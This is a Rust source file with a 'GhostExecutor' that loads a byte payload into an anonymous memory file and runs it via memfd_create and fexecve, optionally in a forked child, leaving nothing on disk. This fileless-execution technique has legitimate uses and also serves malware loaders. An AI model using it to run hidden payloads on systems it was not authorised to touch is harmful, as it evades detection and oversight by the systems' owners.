use std::ffi::CString;
use log::info;

#[cfg(target_os = "linux")]
use std::os::fd::AsRawFd;
#[cfg(target_os = "linux")]
use nix::{
    sys::memfd::{memfd_create, MemFdCreateFlag},
    unistd::write,
    libc,
};

#[cfg(target_os = "linux")]
pub struct GhostExecutor;

#[cfg(target_os = "linux")]
impl GhostExecutor {
    pub fn exec_memfd(name: &str, payload: &[u8], args: &[String], fork_child: bool) -> Result<(), String> {
        let name_cstr = CString::new(name).map_err(|_| "Invalid name")?;
        let memfd = memfd_create(&name_cstr, MemFdCreateFlag::MFD_CLOEXEC)
            .map_err(|e| format!("memfd_create: {}", e))?;

        let raw_fd = memfd.as_raw_fd();
        let mut written = 0;
        while written < payload.len() {
            let n = write(raw_fd, &payload[written..])
                .map_err(|e| format!("write: {}", e))?;
            written += n;
        }

        info!("[Ghost] {} bytes -> fd:{}", written, raw_fd);

        let mut c_args: Vec<CString> = vec![CString::new(name).unwrap()];
        for arg in args {
            c_args.push(CString::new(arg.as_str()).map_err(|_| "Invalid arg")?);
        }
        let c_args_ptr: Vec<*const libc::c_char> = c_args.iter()
            .map(|s| s.as_ptr())
            .chain(std::iter::once(std::ptr::null()))
            .collect();
        
        // Pass minimal environment (PATH required for many binaries)
        let env_path = CString::new("PATH=/usr/bin:/bin:/usr/sbin:/sbin").unwrap();
        let env_home = CString::new("HOME=/tmp").unwrap();
        let c_envs: Vec<*const libc::c_char> = vec![
            env_path.as_ptr(),
            env_home.as_ptr(),
            std::ptr::null()
        ];

        if fork_child {
            // Use libc::fork directly to avoid nix cfg issues during cross-compile
            let pid = unsafe { libc::fork() };
            if pid < 0 {
                return Err(format!("fork failed: {}", std::io::Error::last_os_error()));
            } else if pid > 0 {
                // Parent - child pid is in `pid`
                info!("[Ghost] child:{}", pid);
                return Ok(());
            }
            // Child continues...
        }

        let ret = unsafe { libc::fexecve(raw_fd, c_args_ptr.as_ptr(), c_envs.as_ptr()) };
        Err(format!("fexecve: {} ({})", std::io::Error::last_os_error(), ret))
    }
}

